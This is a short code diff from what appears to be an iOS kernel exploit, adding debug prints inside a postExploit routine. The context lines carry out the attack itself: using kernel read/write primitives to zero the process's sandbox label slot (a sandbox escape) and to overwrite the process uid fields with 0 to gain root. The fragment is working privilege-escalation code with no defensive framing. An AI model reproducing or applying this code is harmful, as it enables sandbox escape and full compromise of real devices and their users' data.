@@ -59,8 +59,10 @@ void postExploit(void) {
     uint64_t label = kread64(ucred + off_u_cr_label);
     kfd_print("label: 0x%llx\n", label);
     kfd_print("uid: %u\n", kread32(ucred + off_u_cr_uid));
+    kfd_print("sandbox: %u\n", kread64(label + 0x10));
     //Escape Sandbox
     kwrite64(label + 0x10, 0);
+    kfd_print("sandbox: %u\n", kread64(label + 0x10));
     //Get Root
     kwrite32(proc + off_p_uid, 0);
     kwrite32(proc + off_p_ruid, 0);
